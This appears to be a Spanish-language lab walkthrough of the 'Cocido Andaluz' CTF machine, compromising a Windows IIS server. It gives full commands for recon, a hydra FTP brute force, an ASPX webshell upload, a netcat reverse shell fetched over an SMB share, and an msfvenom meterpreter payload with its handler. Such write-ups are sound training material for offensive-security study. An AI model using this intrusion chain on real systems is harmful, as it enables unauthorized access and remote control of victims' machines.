Maquinas que voy a utilizar **Kali Linux y Cocido Andaluz** [https://thehackerslabs.com/cocido-andaluz/](https://thehackerslabs.com/cocido-andaluz/)

  

> [!important] Un servidor **Microsoft IIS (Internet Information Services)** es una plataforma de servidor web desarrollada por Microsoft. Es utilizada para alojar páginas y aplicaciones web, así como servicios relacionados con el Protocolo de Transferencia de Hipertexto (**HTTP**). IIS permite a los usuarios publicar contenido web y gestionar funciones relacionadas con servidores, aplicaciones y sitios web.

  

Comando utilizado para ejecutar la reverse shell:

\`\192.168.0.X\recurso\nc.exe -e cmd.exe 192.168.0.X 443`

  

Vamos a intentar obtener **intrusión remota** en un servidor Microsoft IIS mediante un **archivo malicioso con extensión aspx**.

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 48.png|image 48.png]]

  

```Bash
ping -c 1 10.0.3.19  
```

![[Imagenes/image 1 37.png|image 1 37.png]]

El **ttl=128** nos informa que es una maquina **Windows.**

  

```Bash
nmap -p- -sS -sV -sC -min-rate=5000 -n -vvv -Pn 10.0.3.19 
```

![[Imagenes/image 2 36.png|image 2 36.png]]

  

- Provamos la IP en el navegador
    
    ![[Imagenes/image 3 35.png|image 3 35.png]]
    
      
    
- Hacemos **Fuzzing Web con la herramienta dirb.**
    
    ```Bash
    dirb http://10.0.3.19/
    ```
    
    ![[Imagenes/image 4 34.png|image 4 34.png]]
    

  

- Vamos a mirar que puede ser esto.
    
    ![[Imagenes/image 5 33.png|image 5 33.png]]
    
    Por aquí parece que no vemos nada , lo dejamos en pausa y seguimos intentándolo de otra manera.
    
      
    
- Vamos a ver de nuevo la enumeración que hemos hecho con nmap.
    
    ![[Imagenes/image 6 31.png|image 6 31.png]]
    
    Vemos que tiene abierto el **puerto 21** con un **servicio ftp**.
    
- Le vamos a hacer un ataque de fuerza bruta con **hydra** aunque no sepamos el usuario y la contraseña.
    
    ```Bash
    hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ftp://10.0.3.19
    ```
    
    ![[Imagenes/image 7 29.png|image 7 29.png]]
    
      
    
    > [!important] Como vemos estamos usando **distintos diccionarios** para **Usuario** y para **Password**.
    

  

- Con las credenciales que hemos conseguido vamos a entrar por FTP.
    
    ```Bash
    ftp 10.0.3.19 
    ```
    
    ![[Imagenes/image 8 27.png|image 8 27.png]]
    
    **En algunos sitios** podemos encontrarnos con que el **contenido del FTP** esta **vinculado** al **contenido del puerto 80** (la pagina Web). Esto lo **podemos utilizar** para **subir archivos** y poder **verlos desde el navegador**.
    
      
    
    > [!important] En Kali Linux por defecto nos podemos encontrar un archivo cmd malicioso ya creado con **extensión aspx**. Si no esta pues nos crearíamos uno con msfvenom.
    
      
    
- Buscamos la ubicación del archivo de la siguiente manera.
    
    ```Bash
    find / -name cmdasp.aspx 2>/dev/null
    ```
    
    ![[Imagenes/image 9 24.png|image 9 24.png]]
    
      
    
- Nos copiamos este archivo al escritorio para tener mas facilidad de manejo.
    
    ```Bash
    cp /usr/share/webshells/aspx/cmdasp.aspx .
    ```
    
    ![[Imagenes/image 10 21.png|image 10 21.png]]
    
      
    
- Lo subimos al FTP desde el terminal conectado al FTP.
    
    `put cmdasp.aspx`
    
    ![[Imagenes/image 11 15.png|image 11 15.png]]
    
      
    
    > [!important]
    > 
    > ### **Comandos básicos en un FTP**.
    > 
    > 1. **Navegación en Directorios:**
    >     - `ls` o `dir`: Lista los archivos y directorios en el directorio actual.
    >     - `cd [directorio]`: Cambia al directorio especificado.
    >     - `pwd`: Muestra el directorio actual.
    >     - `cd ..`: Retrocede al directorio padre.
    > 2. **Transferencia de Archivos:**
    >     - `get [archivo]`: Descarga un archivo desde el servidor al equipo local.
    >     - `mget [archivos]`: Descarga múltiples archivos a la vez.
    >     - `put [archivo]`: Sube un archivo desde el equipo local al servidor.
    >     - `mput [archivos]`: Sube múltiples archivos a la vez.
    > 3. **Gestión de Archivos:**
    >     - `delete [archivo]`: Elimina un archivo del servidor.
    >     - `rename [archivo_antiguo] [archivo_nuevo]`: Cambia el nombre de un archivo en el servidor.
    >     - `mkdir [directorio]`: Crea un nuevo directorio en el servidor.
    >     - `rmdir [directorio]`: Elimina un directorio vacío del servidor.
    > 4. **Opciones Generales:**
    >     - `quit` o `bye`: Cierra la sesión y desconecta del servidor FTP.
    >     - `help` o `?`: Muestra ayuda o información sobre comandos disponibles.
    
      
    
- Vamos al navegador web y comprobamos si podemos ver el archivo.
    
    ![[Imagenes/image 12 15.png|image 12 15.png]]
    
    Se nos ejecuta una **Webshell** de tal forma que podemos ejecutar archivos desde el navegador.
    
    ![[Imagenes/image 13 15.png|image 13 15.png]]
    

  

  

> [!important] **¿Cómo podemos conseguir intrusión remota a la maquina victima, desde aquí?**
> 
> Basicamente tendríamos dos opciones :
> 
> 1. Creando un archivo malicioso con msfvenom y subiéndolo al ftp.
> 2. Crearnos un recurso compartido que aloje un netcat.exe y a partir de hay conseguir entrar a la maquina victima.
> 
> La segunda opción es mucho mejor por que el Payload malicioso dependería de tener en el directorio donde estamos permisos de escritura. Y podemos tenerlo o no. **La creación de archivo malicioso lo veremos en la siguiente lección.**

  

- Vamos a hacer una búsqueda de nuevo en el Kali. Ya que también por defecto tenemos almacenado un ejecutable **.exe** de **netcat** almacenado.
    
    ```Bash
    find / -name nc.exe 2>/dev/null
    ```
    
    ![[Imagenes/image 14 13.png|image 14 13.png]]
    
      
    
- Lo copiamos al escritorio .
    
    ```Bash
    cp /usr/share/windows-resources/binaries/nc.exe .
    ```
    
    ![[Imagenes/image 15 12.png|image 15 12.png]]
    

  

**La idea** es desde el Kali Linux levantarnos un recurso compartido en la red alojando el nc.exe y luego desde el **Webshell** ejecutar un comando apuntado al recurso compartido y al nc.exe para mandarme una revershell a mi maquina atacante.

> [!important]
> 
> ### Pasos:
> 
> 1. **Preparar el recurso compartido en la red en Kali Linux**
> 2. **Verificar acceso al recurso compartido**
> 3. **Ejecutar comandos desde el Webshell**
> 4. **Escuchar en tu máquina atacante**
> 5. **Recibir la conexión**

  

- Vamos a usar una serie de herramientas llamadas **Impacket** para levantar un recurso compartido en el escritorio**.** 
    
    ```Bash
    impacket-smbserver recurso $(pwd) -smb2support
    ```
    
    ![[Imagenes/image 16 9.png|image 16 9.png]]
    
      
    
    > [!important] `**impacket-smbserver**`:
    > 
    > - Es una herramienta de **Impacket** que permite crear un servidor SMB (Server Message Block) en Kali Linux. Esta utilidad te permite compartir directorios locales de tu máquina en la red mediante el protocolo SMB.
    > 
    > `**recurso**`:
    > 
    > - Este es el **nombre del recurso compartido** que aparecerá en la red. Por ejemplo, si decides llamar al recurso "compartido", será accesible como `\\IP_del_Kali\compartido`.
    > 
    > `**$(pwd)**`:
    > 
    > - Es un comando de **Bash** que devuelve el **directorio de trabajo actual** (el lugar donde te encuentras en la terminal). En este caso, la carpeta desde donde ejecutas el comando será la carpeta que se compartirá a través de SMB.
    > 
    > `**smb2support**`:
    > 
    > - Esta bandera activa el soporte para el protocolo **SMBv2**. Es útil ya que muchos sistemas modernos deshabilitan SMBv1 por razones de seguridad.
    
      
    
- En otro terminal nos ponemos a la escucha por un puerto . Por ejemplo por el 443.
    
    ```Bash
    nc -nlvp 443
    ```
    
    ![[Imagenes/image 17 7.png|image 17 7.png]]
    
      
    
- Nos vamos al navegador web y en el formulario de comandos escribimos lo siguiente donde la primera IP es la maquina Kali y la segunda IP también la de mi maquina Kali .
    
    `\\10.0.3.4\recurso\nc.exe -e cmd.exe 10.0.3.4 443`
    
    ![[051a0b24-ccd8-44f9-bdaf-042afab08cf0.png]]
    
    ![[Imagenes/image 18 5.png|image 18 5.png]]
    
      
    
      
    
- Vamos a proceder a acceder desde una meterpreter ya que en esta ocasión no tenemos privilegios `nt authority\servicio de red.`
    
    En esta maquina Windows en concreto no tiene instaladas las utilidades **wget o curl** , las cuales nos hubieran permitido subir un archivo malicioso.
    
    - Creamos un archivo malicioso .exe
        
        ```Bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=444 -f exe -o shell.exe
        ```
        
        ![[Imagenes/image 19 4.png|image 19 4.png]]
        
    
      
    
    - Cerramos el recurso compartido que habíamos creado en caso de tenerlo activo. Y creamos otro nuevo.
        
        ```Bash
        impacket-smbserver recurso $(pwd) -smb2support
        ```
        
        ![[Imagenes/image 20 4.png|image 20 4.png]]
        
          
        
    - En el termina que habíamos abierto anterior mente de la maquina victima nos movemos al directorio **\Temp .** Ya que por lo general en este directorio tenemos permisos de escritura.
        
        `cd ..`
        
        `cd ..`
        
        `cd temp`
        
        ![[Imagenes/image 21 3.png|image 21 3.png]]
        
          
        
    - Copiamos el archivo shell.exe desde el recurso compartido al directorio **temp**.
        
        `copy \\10.0.3.4\recurso\shell.exe shell.exe`
        
        ![[Imagenes/image 22 3.png|image 22 3.png]]
        
          
        
        - `use multi/handler`
        - `show options`
        - `set LHOST 10.0.3.4`
        - `set LPORT 444`
        - `set PAYLOAD windows/meterpreter/reverse_tcp`
        - `run`
            
            ![[Imagenes/image 23 3.png|image 23 3.png]]
            
    
      
    
    - Vamos a la maquina victima y ejecuto el comando shell.exe
        
        `shell.exe`
        
        ![[Imagenes/image 24 2.png|image 24 2.png]]
        
        ![[Imagenes/image 25 2.png|image 25 2.png]]
        
          
        
        Desde una meterpreter es mas fácil subir privilegios pero eso lo veremos mas adelante.